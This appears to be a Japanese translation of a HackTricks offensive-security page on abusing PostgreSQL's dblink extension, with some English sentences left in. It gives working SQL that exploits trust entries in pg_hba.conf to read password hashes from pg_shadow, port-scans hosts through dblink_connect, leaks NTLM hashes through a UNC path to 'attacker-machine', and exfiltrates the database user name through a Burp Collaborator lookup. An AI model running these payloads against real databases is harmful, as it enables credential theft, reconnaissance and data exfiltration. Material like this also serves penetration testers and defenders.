<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>


**PostgreSQL 9.1**以降、追加モジュールのインストールは簡単です。[`dblink`のような登録済みの拡張機能](https://www.postgresql.org/docs/current/contrib.html)は[`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)でインストールできます：
```sql
CREATE EXTENSION dblink;
```
一旦dblinkをロードすると、いくつかの興味深いトリックを実行できるようになります：

## 権限昇格

ファイル `pg_hba.conf` は、パスワードを知る必要なく**任意のユーザーとして** **localhostからの接続を許可する**ように誤って設定されている可能性があります。このファイルは通常 `/etc/postgresql/12/main/pg_hba.conf` にあり、誤った設定は次のようになります：
```
local    all    all    trust
```
_Note that this configuration is commonly used to modify the password of a db user when the admin forget it, so sometimes you may find it._\
管理者がパスワードを忘れた時にDBユーザーのパスワードを変更するためによく使われる設定ですので、時々見かけることがあります。

_Note also that the file pg\_hba.conf is readable only by postgres user and group and writable only by postgres user._
また、pg\_hba.confファイルはpostgresユーザーとグループのみが読み取り可能で、postgresユーザーのみが書き込み可能であることに注意してください。

This case is **useful if** you **already** have a **shell** inside the victim as it will allow you to connect to postgresql database.
このケースは、被害者のシステム内に**既に**シェルを持っている場合に**役立ちます**。これにより、postgresqlデータベースに接続することができます。

Another possible misconfiguration consist on something like this:
別の可能な誤設定は、以下のようなものです：
```
host    all     all     127.0.0.1/32    trust
```
ローカルホストから任意のユーザーとしてデータベースに接続できるようになります。
この場合、**`dblink`** 関数が**動作している**場合、既に確立された接続を介してデータベースに接続し、アクセスできるはずのないデータにアクセスすることで**権限を昇格**できます：
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
**この攻撃に関する**[**詳細情報はこの論文で確認できます**](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)**。**

## ポートスキャン

`dblink_connect`を悪用することで、**オープンポートを探索**することもできます。その**関数が機能しない場合は、`dblink_connect_u()`を使用してみてください**。ドキュメントによると _`dblink_connect_u()`は`dblink_connect()`と同一ですが、スーパーユーザーでなくても任意の認証方法を使用して接続を許可する点が異なります_。
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
**`dblink_connect` や `dblink_connect_u` を使用する**前に、以下のコマンドを実行する必要があるかもしれません：
```
CREATE extension dblink;
```
## UNCパス - NTLMハッシュの漏洩
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
